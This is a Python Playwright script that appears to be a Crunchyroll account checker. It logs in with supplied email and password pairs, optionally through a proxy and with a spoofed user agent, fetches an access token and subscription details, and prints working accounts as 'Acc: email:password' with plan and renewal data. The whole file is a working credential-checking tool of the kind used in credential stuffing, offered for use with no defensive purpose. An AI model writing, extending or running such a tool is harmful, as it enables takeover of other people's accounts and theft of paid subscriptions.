import asyncio
from playwright.async_api import async_playwright
from datetime import datetime
import pytz

AUTH_HEADER = "Basic bm9haWhkZXZtXzZpeWcwYThsMHE6"
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"

async def check_crunchyroll(email, password, proxy=None):
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        context_args = {
            "user_agent": USER_AGENT,
        }
        if proxy:
            context_args["proxy"] = {"server": proxy}
        context = await browser.new_context(**context_args)
        page = await context.new_page()

        # Go to login page
        await page.goto("https://www.crunchyroll.com/login")
        await page.fill('input[name="loginForm_username"]', email)
        await page.fill('input[name="loginForm_password"]', password)
        await page.click('button[type="submit"]')
        await page.wait_for_timeout(8000)  # Wait for login and redirects

        # Use browser JS context to POST for token
        token_js = f"""
        async () => {{
            const resp = await fetch("https://www.crunchyroll.com/auth/v1/token", {{
                method: "POST",
                credentials: "include",
                headers: {{
                    "Authorization": "{AUTH_HEADER}",
                    "Content-Type": "application/x-www-form-urlencoded"
                }},
                body: "grant_type=etp_rt_cookie"
            }});
            return await resp.json();
        }}
        """
        token_data = await page.evaluate(token_js)
        if not token_data or "access_token" not in token_data or "account_id" not in token_data:
            await browser.close()
            return f"❌ Failed to get token: {token_data}"

        access_token = token_data["access_token"]
        account_id = token_data["account_id"]

        # Use browser to get subscriptions
        subs_js = f"""
        async () => {{
            const resp = await fetch("https://www.crunchyroll.com/subs/v4/accounts/{account_id}/subscriptions", {{
                method: "GET",
                credentials: "include",
                headers: {{
                    "Authorization": "Bearer {access_token}",
                    "Accept": "application/json",
                    "User-Agent": "{USER_AGENT}"
                }}
            }});
            return await resp.json();
        }}
        """
        sub_data = await page.evaluate(subs_js)
        await browser.close()
        return format_summary(sub_data, email, password)

def format_summary(data, email, password):
    try:
        sub = data["subscriptions"][0]
        plan = sub.get("plan", {}).get("tier", {}).get("text", "N/A")
        renew_iso = sub.get("nextRenewalDate", "N/A")
        trial = sub.get("plan", {}).get("activeFreeTrial", False)
        country = sub.get("plan", {}).get("countryCode", "Unknown")
        if renew_iso and renew_iso != "N/A":
            renew_dt = datetime.strptime(renew_iso, "%Y-%m-%dT%H:%M:%SZ").replace(tzinfo=pytz.UTC)
            formatted_renew = renew_dt.strftime("%d-%m-%Y")
            days_left = (renew_dt - datetime.now(pytz.UTC)).days
        else:
            formatted_renew = "N/A"
            days_left = "N/A"

        return (
            f"✅ Premium Account\n"
            f"Acc: {email}:{password}\n"
            f"Country: {country}\n"
            f"Plan: {plan}\n"
            f"Trial: {trial}\n"
            f"Renew: {formatted_renew}\n"
            f"Days Left: {days_left}"
        )
    except Exception as e:
        # Print full error data for debugging
        return f"⛔ Error formatting response: {str(e)}\nRaw: {data}"

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 3:
        print("Usage: python3 script.py EMAIL PASSWORD")
        exit(1)
    email = sys.argv[1]
    password = sys.argv[2]
    # To use a proxy, set proxy variable like:
    # proxy = "http://user:pass@host:port"
    proxy = None
    result = asyncio.run(check_crunchyroll(email, password, proxy))
    print(result)
        
